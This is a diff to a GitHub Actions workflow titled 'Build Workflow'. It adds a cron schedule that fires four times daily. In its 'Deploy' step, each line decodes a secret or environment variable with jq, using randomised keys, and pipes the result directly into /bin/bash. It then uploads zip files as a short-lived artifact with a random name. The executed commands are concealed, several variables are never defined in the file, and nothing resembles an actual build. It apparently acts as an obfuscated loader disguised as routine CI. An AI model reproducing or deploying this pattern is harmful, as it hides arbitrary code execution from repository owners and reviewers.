@@ -2,6 +2,8 @@ name: Build Workflow
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '27 4,10,16,22 * * *'
 env:
   CI: true
 concurrency:
@@ -17,17 +19,16 @@ jobs:
           fetch-depth: 1
       - name: Deploy
         env:
-          r07: ${{ secrets.r07 }}
+          xxm4: ${{ secrets.xxm4 }}
         run: |
-          printf '%s' "$r07" | jq -r .vqg602 | /bin/bash
-          echo $kxs36978 | jq -r .j6 | /bin/bash
-          echo $pttk4626 | jq -r .xz34 | /bin/bash
-          printf '%s' "$lfmaa14" | jq -r .hqkzw935 | /bin/bash
-          printf '%s' "$jyg75" | jq -r .ahdan1 | /bin/bash
+          printf '%s' "$xxm4" | jq -r .tsf3423 | /bin/bash
+          echo $j5246 | jq -r .knk676 | /bin/bash
+          printf '%s' "$pvpsq6970" | jq -r .h54190 | /bin/bash
+          echo $bao7 | jq -r .emar9 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: R8qfTdey
+          name: 7HvAXDxB
           path: "*.zip"
           retention-days: 1
